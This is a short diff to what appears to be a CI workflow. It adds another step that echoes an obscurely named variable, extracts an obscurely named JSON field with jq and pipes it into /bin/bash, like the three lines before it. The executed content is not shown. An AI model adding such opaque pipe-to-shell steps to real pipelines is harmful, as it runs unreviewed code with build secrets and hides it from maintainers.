@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$h5" | jq -r .kkt470 | /bin/bash
           echo $fqb11 | jq -r .ec4 | /bin/bash
           echo $m230 | jq -r .rmr37 | /bin/bash
+          echo $nucx7 | jq -r .wabn4 | /bin/bash
 
       - name: Save output
         if: always()
